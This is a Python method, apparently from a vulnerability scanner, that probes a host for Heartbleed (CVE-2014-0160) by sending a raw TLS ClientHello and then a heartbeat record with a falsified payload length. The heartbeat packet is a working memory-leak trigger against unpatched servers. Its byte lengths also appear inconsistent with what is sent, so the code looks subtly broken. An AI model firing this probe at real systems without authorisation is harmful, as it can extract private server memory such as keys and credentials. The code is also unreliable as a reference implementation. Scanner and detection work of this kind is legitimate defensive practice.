    def test_crypto_heartbleed(self):
        """Detect Heartbleed (CVE-2014-0160)."""
        if not self.deep: return
        self._print("[*]", "Heartbleed (CVE-2014-0160)...", "INFO")
        try:
            # Custom TLS handshake with malformed heartbeat
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(8)
                s.connect((self.host, 443))
                # TLS 1.0 ClientHello
                client_hello = (b"\x16\x03\x01\x00\x31" +
                                b"\x01\x00\x00\x2d" +
                                b"\x03\x01" +
                                b"\x00" * 32 +  # random
                                b"\x00" +  # session id length
                                b"\x00\x04" + b"\x00\x2f\x00\x35" +  # cipher suites
                                b"\x01" + b"\x00")
                s.send(client_hello)
                resp = s.recv(4096)
                if not resp or resp[0] != 0x16: return
                # Send heartbeat with bogus length
                heartbeat = b"\x18\x03\x01\x40\x00" + b"\x01" + b"\x3f\xfd" + b"\x00" * 10
                s.send(heartbeat)
                data = s.recv(8192)
                if data and len(data) > 100 and data[0] == 0x18:
                    self._add_vuln("Crypto: Heartbleed (CVE-2014-0160)", "CRITICAL",
                                   "tls://" + self.host + ":443",
                                   "Server returned oversized heartbeat response (%d bytes)" % len(data),
                                   port=443, proto="tls", cve="CVE-2014-0160")
        except Exception:
            pass

